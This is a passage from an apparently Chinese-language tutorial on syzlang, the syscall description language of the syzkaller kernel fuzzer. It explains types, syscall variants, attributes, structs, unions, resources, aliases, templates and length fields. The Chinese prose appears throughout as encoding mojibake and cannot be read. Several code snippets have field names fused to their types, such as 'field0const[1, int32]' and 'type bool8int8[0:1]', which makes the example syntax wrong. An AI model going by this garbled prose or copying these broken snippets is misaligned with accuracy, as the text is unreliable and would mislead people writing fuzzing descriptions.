<code>å­—æ®µ</code> åœ¨å…¶ parent struct ä¸­çš„åç§»<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  <code>å­—æ®µ</code></li></ul></li></ul></li><li><strong>vma</strong> æˆ– <strong>vma64</strong>ï¼šæŒ‡å‘ä¸€ç»„é¡µçš„æŒ‡é’ˆï¼ˆç”¨ä½œ mmap/munmap/mremap/madvise çš„è¾“å…¥ï¼‰<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  ï¼ˆå¯é€‰ï¼‰é¡µçš„æ•°é‡æˆ–é¡µçš„èŒƒå›´ï¼šå‰è€…ä¾‹å¦‚ <code>vma[7]</code>ï¼Œåè€…ä¾‹å¦‚ <code>vma[2-4]</code></li></ul></li><li>  vma64 çš„é•¿åº¦æ’ä¸º 8 å­—èŠ‚</li></ul></li><li><strong>proc</strong>ï¼šå•ä¸ªè¿›ç¨‹çš„æ•´å‹ï¼ˆè¯¦è§ä¸‹é¢çš„æè¿°ï¼‰<ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  å€¼çš„åŒºé—´çš„èµ·å§‹</li><li>  æ¯ä¸ªè¿›ç¨‹çš„å€¼çš„æ•°é‡</li><li>  åŸºç¡€ç±»å‹</li></ul></li></ul></li><li><strong>text</strong>ï¼šç‰¹å®š type çš„æœºå™¨ç <ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>  ä»£ç ç±»å‹ï¼š<code>x86_real</code>, <code>x86_16</code>, <code>x86_32</code>, <code>x86_64</code>, <code>arm64</code></li></ul></li></ul></li><li><strong>void</strong>ï¼štype with static size 0<ul><li>  é€šå¸¸åœ¨æ¨¡æ¿ä»¥åŠå¯å˜é•¿ï¼ˆvarlenï¼‰è”åˆä½“ä¸­ä½¿ç”¨ï¼Œ<strong>ä¸èƒ½ç”¨ä½œç³»ç»Ÿè°ƒç”¨çš„å‚æ•°</strong></li></ul></li></ul><p>åœ¨ <code>ç»“æ„ä½“/è”åˆä½“/æŒ‡é’ˆ</code> ä¸­ä½¿ç”¨æ—¶ï¼Œ<code>flags/len/flags</code> çš„æ„æˆä¸­å°¾éƒ¨è¿˜å¯ä»¥è·Ÿç€ type type-options</p><p>æ¥ç€æä¸€ä¸‹ç±»å‹é€‰é¡¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type-options = [type-opt [<span class="string">&quot;,&quot;</span> type-opt]]</span><br></pre></td></tr></table></figure><p>å½¢å¼å¦‚ä¸Šï¼Œä»ä¸€å¼€å§‹çš„è¯­æ³•è§„åˆ™æ¥çœ‹<code>type-options</code>å¯¹äº<code>type</code>å³ä¸ºå¯é€‰é¡¹ï¼Œä¹Ÿå¯ä»¥åŒæ—¶æ‹¥æœ‰å¤šä¸ª<code>type-options</code>ï¼ŒåŒæ ·æ ¹æ®å‰é¢çš„è¯­æ³•è§„åˆ™å¯ä»¥çœ‹å‡ºæ¥è¦ä½¿ç”¨<code>type-options</code>æ˜¯åº”å¦‚ä¸‹ä¾‹ä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flags flags[open_flags]</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªä¾‹å­çš„è§£æï¼Œæˆ‘ä»¬è¿™ä¸ªå‚æ•°åä¸º<code>flags</code>å‚æ•°ï¼Œè¾“å…¥çš„ç±»å‹ä¸º<code>flags</code>ï¼Œå…¶ç±»å‹é€‰é¡¹ä¸ºå¯¹ä¸€ä¸ª<code>flags</code>æè¿°<code>open_flags</code>çš„åº”ç”¨ï¼Œå³ä¸ºå–<code>open_flags</code>ä¸­çš„å€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>open_flags</code>å®šä¹‰çš„å†…å®¹å¦‚ä¸Šï¼Œè¿™äº›å€¼å¯ä»¥é€šè¿‡<code>include</code>è¯­å¥ä»å†…æ ¸æºç ä¸­è¢«åŒ…å«è¿›æ¥ã€‚</p><h3 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h3><p>åœ¨å‰é¢æåˆ°äº†ç³»ç»Ÿè°ƒç”¨çš„æ¨¡æ¿å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscallname <span class="string">&quot;(&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;)&quot;</span> [type] [<span class="string">&quot;(&quot;</span> attribute* <span class="string">&quot;)&quot;</span>]</span><br></pre></td></tr></table></figure><p>å…¶ä¸­é™¤äº†<code>attribute</code>éƒ½å·²ç»åšè¿‡ä¸€å®šè§£é‡Šäº†ï¼Œè¿™é‡Œåœ¨å¯¹å…¶åšåˆ†è§£åˆ†æã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])</span><br><span class="line"></span><br><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹<code>open</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå­˜åœ¨ä»¥ä¸‹ä¸‰ä¸ªè¾“å…¥ï¼š</p><ul><li>  file å‚æ•°ï¼šä¸€ä¸ªæŒ‡é’ˆç±»å‹ï¼Œå…¶ type-opetions çš„ç¬¬ä¸€ä¸ªä¸º <code>in</code>ï¼Œæ„ä¸ºç”±è¯¥æŒ‡é’ˆæŒ‡å‘ç‰¹å®šå¯¹è±¡ï¼Œç¬¬äºŒä¸ªä¸º <code>filename</code>ï¼Œä¸ºç‰¹æ®Šçš„ string å¯¹è±¡ï¼Œå¯¹äº filenameï¼Œsyzlang ä¼šè¿›è¡Œæ–‡ä»¶ç”Ÿæˆï¼Œå°†æ–‡ä»¶åä½œä¸ºè¾“å…¥</li><li>  flags å‚æ•°ï¼šä¸€ä¸ª flagsç±»å‹ï¼Œå…¶ <code>type-options</code> ä¸º <code>open_flags</code> ï¼Œæ„ä¸ºä»æˆ‘ä»¬å®šä¹‰çš„ flagsâ€”â€”<code>open_flags</code> ä¸­å–å€¼</li><li>  mode å‚æ•°ï¼šä¸€ä¸ªflagsç±»å‹ï¼Œå…¶ <code>type-options</code> ä¸º <code>open_mode</code> ï¼Œæ„ä¸ºä»æˆ‘ä»¬å®šä¹‰çš„ flagsâ€”â€”<code>open_mode</code> ä¸­å–å€¼</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œç³»ç»Ÿè°ƒç”¨éƒ½ä¼šå­˜åœ¨è¿”å›å€¼ï¼Œåœ¨<code>syzlang</code>ä¸­å¯ä»¥å¿½ç•¥æ‰è¿”å›å€¼ä¹Ÿå¯ä»¥é€‰æ‹©æ¥æ”¶ï¼Œå¦‚æœé€‰æ‹©æ¥æ”¶åˆ™åº”å½¢å¦‚ä¸Šå¼åœ¨ç³»ç»Ÿè°ƒç”¨åé¢åŠ ä¸Šä¸€ä¸ª<code>type</code>ï¼Œä¾‹å¦‚<code>open</code>ç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè‹¥æ˜¯æˆ‘ä»¬åƒå°†å…¶è¿”å›çš„çš„æ–‡ä»¶æè¿°ç¬¦å­˜åˆ°ä¸€ä¸ªå˜é‡ä¸­å¦‚<code>test_fd</code>ï¼Œæˆ‘ä»¬åº”å½“å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) test_fd</span><br><span class="line"></span><br><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ–‡ä»¶æè¿°ç¬¦ä¸­å·²ç»å­˜åœ¨æˆ‘ä»¬çš„å˜é‡ï¼Œé‚£ä¹ˆåœ¨åç»­ä¹Ÿæ˜¯å¯ä»¥ç»§ç»­ä½¿ç”¨çš„ï¼Œå¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close(fd test_fd)</span><br></pre></td></tr></table></figure><p>éšåå°±æ˜¯å‰é¢æåˆ°çš„ï¼Œåœ¨<code>type</code>åè¿˜æœ‰ä¸€ä¸ªå¯é€‰å‚æ•°<code>attribute</code>ï¼Œå…¶æœ‰ä»¥ä¸‹å¯é€‰å€¼ï¼š</p><ul><li>  <code>disabled</code>ï¼šè¯¥ç³»ç»Ÿè°ƒç”¨å°†ä¸ç”¨äº fuzzingï¼›è¿™ä¸ªå±æ€§é€šå¸¸ç”¨äºä¸´æ—¶ç¦ç”¨æŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ–è€…ç¦ç”¨ç‰¹å®šçš„å‚æ•°ç»„åˆ</li><li>  <code>timeout[N]</code>ï¼šç³»ç»Ÿè°ƒç”¨åœ¨é»˜è®¤å€¼ä»¥å¤–çš„é¢å¤–çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’ï¼ˆmsï¼‰</li><li>  <code>prog_timeoout[N]</code>ï¼šè‹¥ä¸€ä¸ªç¨‹åºåŒ…å«äº†è¯¥ç³»ç»Ÿè°ƒç”¨ï¼Œåˆ™è¯¥å±æ€§ä¸ºæ•´ä¸ªç¨‹åºçš„æ‰§è¡Œçš„è¶…æ—¶æ—¶é—´ï¼Œè‹¥å­˜åœ¨å¤šä¸ªå®šä¹‰äº†è¯¥å±æ€§çš„ç³»ç»Ÿè°ƒç”¨åˆ™å–æœ€å¤§å€¼</li><li>  <code>ignore_return</code>ï¼šåœ¨å›é€€åé¦ˆä¸­å¿½è§†è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼ï¼›ç”¨äºä¸è¿”å›å›ºå®šçš„é”™è¯¯ç ï¼ˆä¾‹å¦‚ -EFAULTï¼‰è€Œæ˜¯è¿”å›å…¶ä»–å€¼çš„ç³»ç»Ÿè°ƒç”¨</li><li>  <code>break_returns</code>ï¼šå¿½ç•¥å›é€€åé¦ˆä¸­ç¨‹åºä¸­æ‰€æœ‰åç»­ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼</li></ul><p>æ¥ç€å°±æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å˜ç§ï¼ˆvariantsï¼‰å¯ä»¥åœ¨ç³»ç»Ÿè°ƒç”¨ååé¢ä½¿ç”¨ <code>$</code> ç¬¦å·è¿›è¡Œé¢å¤–çš„æŒ‡å®š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket$inet_tcp(domain <span class="keyword">const</span>[AF_INET], type <span class="keyword">const</span>[SOCK_STREAM], proto <span class="keyword">const</span>[<span class="number">0</span>]) sock_tcp</span><br><span class="line">socket$inet_udp(domain <span class="keyword">const</span>[AF_INET], type <span class="keyword">const</span>[SOCK_DGRAM], proto <span class="keyword">const</span>[<span class="number">0</span>]) sock_udp</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚socketç³»ç»Ÿè°ƒç”¨å¯ä»¥ç”¨äºåˆ›å»ºå¾ˆå¤šç±»å‹çš„socketï¼Œä¸Šè¿°å®šä¹‰äº†ä¸¤ç§ä¸åŒçš„å˜ä½“ã€‚è€Œå˜ç§çš„ä½œç”¨ä¸»è¦æ˜¯åŒºåˆ†syscallï¼Œç±»ä¼¼äºåˆ«åçš„æ•ˆæœã€‚</p><h3 id="æ•´å‹"><a href="#æ•´å‹" class="headerlink" title="æ•´å‹"></a>æ•´å‹</h3><p>æ•´å‹ä¹Ÿæ˜¯ä¸€ç§ typeï¼Œå…¶å¯é€‰é¡¹ä¸º <code>int8</code> ã€<code>int16</code>ã€<code>int32</code>ã€<code>int64</code>ï¼Œè¡¨ç¤ºç›¸åº”å¤§å°çš„æ•´å‹ï¼Œ<code>intptr</code> ç”¨ä»¥è¡¨ç¤ºä¸€ä¸ª<strong>æŒ‡é’ˆå¤§å°</strong>çš„æ•´å‹ï¼Œå¯¹åº” C è¯­è¨€ä¸­çš„ <code>long</code>ï¼Œé€šè¿‡æ·»åŠ  <code>be</code> åç¼€è¡¨ç¤ºè¿™ä¸ªæ•´å‹å­˜å‚¨ä¸ºå¤§ç«¯åºã€‚</p><p>å¯ä»¥ç”¨ int32[0:100] æˆ– int32[0:4096,512] çš„æ ¼å¼ä¸ºä¸€ä¸ª 512 å¯¹é½çš„ int æŒ‡å®šä¸€ä¸ªæ•´æ•°çš„å€¼èŒƒå›´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read$eventfd(fd fd_event, val ptr[out, int64], len len[val])</span><br></pre></td></tr></table></figure><h3 id="ç»“æ„ä½“"><a href="#ç»“æ„ä½“" class="headerlink" title="ç»“æ„ä½“"></a>ç»“æ„ä½“</h3><p>åœ¨<code>syzlang</code>ä¸­åŒæ ·å¯ä»¥å­˜åœ¨ç»“æ„ä½“ï¼Œè”åˆä½“è¿™ä¸€è¯´ï¼Œæ—¢ç„¶å‰é¢å·²ç»æåˆ°äº†è¿™ä¹ˆå¤šï¼Œè¿™é‡Œå°±æ”¾ä¸€ä¸ªå®ƒçš„ä¸€ä¸ªè¯­æ³•ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">structname <span class="string">&quot;&#123;&quot;</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">(fieldname type (<span class="string">&quot;(&quot;</span> fieldattribute* <span class="string">&quot;)&quot;</span>)? <span class="string">&quot;\n&quot;</span>)+</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span> (<span class="string">&quot;[&quot;</span> attribute* <span class="string">&quot;]&quot;</span>)?</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥ç»“æ„å…¶å®å’Œcçš„å¾ˆç±»ä¼¼ï¼Œå®šä¹‰ä¸€ä¸ª<code>structname</code>ï¼Œç„¶åå†…éƒ¨æˆå‘˜åŒ…å«äº†<code>fieldname / type</code>ä»¥åŠåé¢å¯ä»¥æ·»åŠ <code>(fieldattribute)</code>ï¼Œè¿™é‡Œçš„å±æ€§ä¸å‰é¢çš„æ˜¯æœ‰ä¸€å®šå·®è·çš„ï¼Œè¿™é‡Œçš„å±æ€§åªæœ‰æ–¹å‘<code>in / out / inout</code></p><p>æœ€åå¯ä»¥çœ‹åˆ°åœ¨ç»“æ„ä½“ç»“å°¾å¯ä»¥è¢«<code>[attribute]</code>æ¥æ·»åŠ å±æ€§ï¼Œè¿™é‡Œå­˜åœ¨ä»¥ä¸‹å±æ€§ï¼š</p><ul><li>  <code>packed</code>ï¼šè¯¥ç»“æ„ä½“ä¸åŒå­—æ®µä¹‹é—´æ²¡æœ‰ paddingï¼ˆä¾‹å¦‚ C ä¸­æœ‰ä¸€ä¸ªç»“æ„ä½“ <code>struct T&#123;int a; char b;&#125;;</code>ï¼Œchar ä¸º 1 å­—èŠ‚ï¼Œint ä¸º 4 å­—èŠ‚ï¼Œé‚£ä¹ˆè¯¥ç»“æ„ä½“ä¾¿ä¼šå¯¹ 4 å­—èŠ‚å¯¹é½ï¼Œåœ¨å…¶ä¸¤ä¸ªå­—æ®µä¹‹é—´å°±ä¼šæœ‰ 3 å­—èŠ‚çš„ paddingï¼‰</li><li>  <code>align[N]</code>ï¼šæŒ‡å®šè¯¥ç»“æ„ä½“å¯¹ N å­—èŠ‚å¯¹é½ï¼Œpadding çš„å†…å®¹å¹¶æœªæŒ‡å®šï¼ˆé€šå¸¸ä¸º0ï¼‰</li><li>  <code>size[N]</code>ï¼šç»“æ„ä½“è¢«å¡«å……åˆ°æŒ‡å®šçš„å¤§å° <code>N</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test_struct &#123;</span><br><span class="line">field0<span class="keyword">const</span>[<span class="number">1</span>, int32]  (in)</span><br><span class="line"><span class="function">field1<span class="title">int32</span>         <span class="params">(inout)</span></span></span><br><span class="line"><span class="function">field2<span class="title">fd</span><span class="params">(out)</span></span></span><br><span class="line"><span class="function">&#125; [packed]</span></span><br></pre></td></tr></table></figure><p>ä¸ç»“æ„ä½“ç±»ä¼¼ï¼Œè”åˆä½“çš„è¯­æ³•ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unionname <span class="string">&quot;[&quot;</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">(fieldname type (<span class="string">&quot;(&quot;</span> fieldattribute* <span class="string">&quot;)&quot;</span>)? <span class="string">&quot;\n&quot;</span>)+</span><br><span class="line"><span class="string">&quot;]&quot;</span> (<span class="string">&quot;[&quot;</span> attribute* <span class="string">&quot;]&quot;</span>)?</span><br></pre></td></tr></table></figure><p>ä¸å‰é¢çš„åŒºåˆ«ä¸»è¦æ˜¯æœ€åçš„<code>[attribute]</code>ä¸­çš„å¯é€‰æ€§çš„åŒºåˆ«ï¼Œè¿™é‡Œä¸»è¦æœ‰ï¼š</p><ul><li>  <code>varlen</code>ï¼šè”åˆä½“çš„å¤§å°å¯å˜ï¼ˆä¸ºæŒ‡å®šçš„å­—æ®µçš„é•¿åº¦ï¼‰ï¼Œè‹¥æœªæŒ‡å®šåˆ™è¯¥è”åˆä½“å¤§å°ä¸ºå…¶æœ€å¤§å­—æ®µçš„å¤§å°ï¼ˆç±»å‹ C è¯­è¨€ï¼‰</li><li>  <code>size[N]</code>ï¼šè¯¥è”åˆä½“è¢«å¡«å……åˆ°æŒ‡å®šçš„å¤§å° <code>N</code></li></ul><h3 id="èµ„æº"><a href="#èµ„æº" class="headerlink" title="èµ„æº"></a>èµ„æº</h3><p>èµ„æºçš„å®šä¹‰æ˜¯ä½œä¸ºä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¾“å…¥çš„å€¼ã€‚åœ¨å‰é¢çš„æ—¶å€™å…¶å®å·²ç»æ˜¯æåˆ°è¿‡äº†ï¼Œä½¿ç”¨openç³»ç»Ÿè°ƒç”¨æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦å†äº¤ç”±closeç³»ç»Ÿè°ƒç”¨è¿›è¡Œå…³é—­ï¼Œå¦‚æœè¦å®ç°è¿™æ ·çš„æ•ˆæœåˆ™éœ€è¦å£°æ˜ä¸€ä¸ªèµ„æºã€‚èµ„æºçš„å½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;resource&quot;</span> identifier <span class="string">&quot;[&quot;</span> underlying_type <span class="string">&quot;]&quot;</span> [ <span class="string">&quot;:&quot;</span> <span class="keyword">const</span> (<span class="string">&quot;,&quot;</span> <span class="keyword">const</span>)* ]</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>identifier</code>å³ä½å…¶æ ‡è¯†ä¹Ÿå°±æ˜¯åå­—ï¼Œåé¢çš„<code>underlying_type</code> å¯ä»¥æ˜¯ <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>, <code>intptr</code> æˆ–è€…æ˜¯å¦ä¸€ä¸ªèµ„æºã€‚å¸¸é‡é›†åˆå¯ä»¥ä½œä¸ºå¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºè¯¥èµ„æºçš„ç‰¹æ®Šå€¼ï¼ˆæ¯”å¦‚è¯´ 0xdeadbeefï¼‰ï¼Œç‰¹æ®Šå€¼å¶å°”è¢«ç”¨ä½œèµ„æºçš„å€¼ï¼Œè‹¥æœªæŒ‡å®šç‰¹æ®Šå€¼ï¼Œåˆ™ä¼šä½¿ç”¨ç‰¹æ®Šå€¼ <code>0</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resource fd[int32]: <span class="number">0xffffffffffffffff</span>, AT_FDCWD, <span class="number">1000000</span></span><br><span class="line">resource sock[fd]</span><br><span class="line">resource sock_unix[sock]</span><br><span class="line"></span><br><span class="line">socket(...) <span class="function">sock</span></span><br><span class="line"><span class="function"><span class="title">accept</span><span class="params">(fd sock, ...)</span> sock</span></span><br><span class="line"><span class="function"><span class="title">listen</span><span class="params">(fd sock, backlog int32)</span></span></span><br></pre></td></tr></table></figure><p>èµ„æºä¸ä¸€å®šæ˜¯ç³»ç»Ÿè°ƒç”¨çš„è¿”å›ï¼Œä»–å¯ä»¥åƒå…¶ä»–ä»»ä½•æ•°æ®ä¸€æ ·è¢«ä½¿ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource[int32]</span><br><span class="line"></span><br><span class="line">request_producer(..., arg ptr[out, my_resource])</span><br><span class="line">request_consumer(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line">attrmy_resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºæ›´ä¸ºå¤æ‚çš„ç”Ÿäº§è€…/æ¶ˆè´¹è€…åœºæ™¯ï¼Œå­—æ®µå±æ€§ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource_1[int32]</span><br><span class="line">resource my_resource_2[int32]</span><br><span class="line"></span><br><span class="line">request_produce1_consume2(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line"><span class="function">field0<span class="title">my_resource_1</span><span class="params">(out)</span></span></span><br><span class="line"><span class="function">field1<span class="title">my_resource_2</span><span class="params">(in)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ç±»å‹åˆ«å"><a href="#ç±»å‹åˆ«å" class="headerlink" title="ç±»å‹åˆ«å"></a>ç±»å‹åˆ«å</h3><p>è¿™ä¸ªçš„å½¢å¼å¾ˆç±»ä¼¼äºCè¯­è¨€ä¸­çš„<code>typedef</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type identifier underlying_type</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type bool8int8[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool16int16[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool32int32[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool64int64[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type boolptrintptr[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line"></span><br><span class="line">type filename <span class="built_in">string</span>[filename]</span><br><span class="line"></span><br><span class="line">type buffer[DIR] ptr[DIR, <span class="built_in">array</span>[int8]]</span><br></pre></td></tr></table></figure><p>åœ¨å¸ƒå°”ä¸­çš„å–å€¼è¿”å›å°±æ˜¯0å’Œ1æ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>intN[0:1]</code>æ¥è¾¾åˆ°æ•ˆæœï¼Œä¸è¿‡åœ¨åé¢æ¯æ¬¡ä½¿ç”¨ä¼šä½¿çš„æ˜“è¯»æ€§å¤§æ‰“æŠ˜æ‰£ï¼Œæ‰€ä»¥å¯ä»¥å®šä¹‰ä¸ºboolã€‚</p><h3 id="ç±»å‹æ¨¡æ¿"><a href="#ç±»å‹æ¨¡æ¿" class="headerlink" title="ç±»å‹æ¨¡æ¿"></a>ç±»å‹æ¨¡æ¿</h3><p>å…¶å½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type optional[T] [</span><br><span class="line">valT</span><br><span class="line"><span class="keyword">void</span><span class="keyword">void</span></span><br><span class="line">] [varlen]</span><br></pre></td></tr></table></figure><p>å…¶åœ¨çš„ç®€å•çš„ç”¨æ³•ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">type buffer[DIR] ptr[DIR, <span class="built_in">array</span>[int8]]</span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line">type nlattr[TYPE, PAYLOAD] &#123;</span><br><span class="line">nla_lenlen[parent, int16]</span><br><span class="line">nla_type<span class="keyword">const</span>[TYPE, int16]</span><br><span class="line">payloadPAYLOAD</span><br><span class="line">&#125; [align_4]</span><br><span class="line"></span><br><span class="line">syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]])</span><br></pre></td></tr></table></figure><h3 id="é•¿åº¦"><a href="#é•¿åº¦" class="headerlink" title="é•¿åº¦"></a>é•¿åº¦</h3><p>ä½ å¯ä»¥ä½¿ç”¨å…³é”®å­— <code>len</code>ã€<code>bytesize</code>ã€<code>bitsize</code> æ¥æŒ‡å®šç»“æ„ä½“å½“ä¸­ç‰¹å®šå­—æ®µçš„é•¿åº¦ï¼Œè‹¥æ˜¯ <code>len</code> çš„å‚æ•°ä¸ºä¸€ä¸ªæŒ‡é’ˆï¼Œåˆ™å…¶å–å€¼ä¸ºæŒ‡é’ˆæ‰€æŒ‡å¯¹è±¡çš„å¤§å°ï¼Œè‹¥è¦è¡¨ç¤ºä¸€ä¸ª N å­—èŠ‚çš„å­—ä¸­å­—æ®µçš„é•¿åº¦ï¼Œåˆ™åº”å½“ä½¿ç”¨ <code>bytesizeN</code>ï¼Œå…¶ä¸­ N çš„å–å€¼å¯ä»¥ä¸º 1ã€2ã€4ã€8ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">write(fd fd, buf ptr[in, <span class="built_in">array</span>[int8]], count len[buf])</span><br><span class="line"></span><br><span class="line">sock_fprog &#123;</span><br><span class="line">lenlen[filter, int16]</span><br><span class="line">filterptr[in, <span class="built_in">array</span>[sock_filter]]</span><br><span 